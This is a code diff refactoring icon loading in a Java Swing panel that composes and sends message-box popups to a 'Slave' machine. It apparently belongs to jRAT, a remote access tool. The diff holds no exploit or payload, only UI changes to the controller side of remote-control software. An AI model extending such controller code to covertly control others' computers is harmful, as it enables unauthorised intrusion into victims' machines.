@@ -7,7 +7,6 @@ import javax.swing.BorderFactory;
 import javax.swing.ButtonGroup;
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
-import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JCheckBox;
 import javax.swing.JLabel;
@@ -22,6 +21,7 @@ import javax.swing.ScrollPaneConstants;
 
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet10Messagebox;
+import se.jrat.client.utils.IconUtils;
 
 
 @SuppressWarnings("serial")
@@ -84,10 +84,10 @@ public class PanelControlMessagebox extends PanelControlParent {
 				sl.addToSendQueue(new Packet10Messagebox(chckbxSetSystemFeel.isSelected(), getIcon(), txtTitle.getText(), txtMsg.getText()));
 			}
 		});
-		btnSend.setIcon(new ImageIcon(PanelControlMessagebox.class.getResource("/icons/right.png")));
+		btnSend.setIcon(IconUtils.getIcon("right"));
 
 		JButton btnTest = new JButton("Test");
-		btnTest.setIcon(new ImageIcon(PanelControlMessagebox.class.getResource("/icons/messagebox.png")));
+		btnTest.setIcon(IconUtils.getIcon("messagebox"));
 		btnTest.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				JOptionPane.showMessageDialog(null, txtMsg.getText(), txtTitle.getText(), getIcon());
@@ -107,19 +107,19 @@ public class PanelControlMessagebox extends PanelControlParent {
 
 		btnInfo = new JToggleButton("");
 		buttonGroup.add(btnInfo);
-		btnInfo.setIcon(new ImageIcon(PanelControlMessagebox.class.getResource("/icons/box_info.png")));
+		btnInfo.setIcon(IconUtils.getIcon("box_info"));
 
 		btnQuestion = new JToggleButton("");
 		buttonGroup.add(btnQuestion);
-		btnQuestion.setIcon(new ImageIcon(PanelControlMessagebox.class.getResource("/icons/box_question.png")));
+		btnQuestion.setIcon(IconUtils.getIcon("box_question"));
 
 		btnWarning = new JToggleButton("");
 		buttonGroup.add(btnWarning);
-		btnWarning.setIcon(new ImageIcon(PanelControlMessagebox.class.getResource("/icons/box_warning.png")));
+		btnWarning.setIcon(IconUtils.getIcon("box_warning"));
 
 		btnError = new JToggleButton("");
 		buttonGroup.add(btnError);
-		btnError.setIcon(new ImageIcon(PanelControlMessagebox.class.getResource("/icons/box_error.png")));
+		btnError.setIcon(IconUtils.getIcon("box_error"));
 
 		btnNone = new JToggleButton("None");
 		buttonGroup.add(btnNone);
